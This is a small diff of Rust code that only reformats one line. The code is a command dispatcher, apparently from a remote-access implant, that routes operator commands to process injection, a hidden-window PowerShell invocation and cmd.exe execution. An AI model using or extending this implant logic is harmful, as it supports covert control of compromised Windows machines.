@@ -76,7 +76,10 @@ fn dispatch(command: &str, parameters: &str) -> String {
         "integrity" => integrity_level(),
         "inject" => inject_cmd(parameters),
         "cmd" => shell_exec("cmd.exe", &["/C", parameters]),
-        "powershell" => shell_exec("powershell.exe", &["-noP", "-sta", "-w", "1", "-c", parameters]),
+        "powershell" => shell_exec(
+            "powershell.exe",
+            &["-noP", "-sta", "-w", "1", "-c", parameters],
+        ),
         "shell" => shell_exec("cmd.exe", &["/C", parameters]),
         _ => shell_exec("cmd.exe", &["/C", &raw]),
     }
